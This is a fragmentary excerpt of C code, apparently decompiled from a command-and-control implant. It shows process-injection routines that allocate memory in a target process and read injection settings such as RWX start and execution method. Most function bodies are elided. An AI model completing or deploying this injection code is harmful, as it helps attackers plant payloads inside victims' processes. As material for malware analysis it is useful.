...
PVOID sub_10005053(HANDLE ProcessHandle, char* payload, size_t Size)
{
	...
	int min_alloc = get_dword(45);//.process-inject.min_alloc
	if (Size > min_alloc)
	{
		min_alloc = Size;
	}
...
char* sub_10005120(HANDLE ProcessHandle, char* payload, size_t Size)
{
	...
	int startrwx = get_short(43);//.process-inject.startrwx
...
char* allocator_option(size_t payload_size, BeaconProcessInject* pBeaconProcessInject, char* payload)
{
	...
	if (get_short(52) == 1 && pBeaconProcessInject->is_system_process)
	{
...
{
	datap pdatap;
	char* process_inject_execute = get_str(51);//.process-inject.execute
...
void ProcessInject(int pid, PROCESS_INFORMATION* pi, HANDLE hProcess, char* payload, size_t p_len, int p_offset, char* arg, int a_len)
{
	...
	char* process_inject_transform = get_str((pBeaconProcessInject.is_process_arch == 1) + 46);// 46  .process-inject.transform-x86   256 bytes
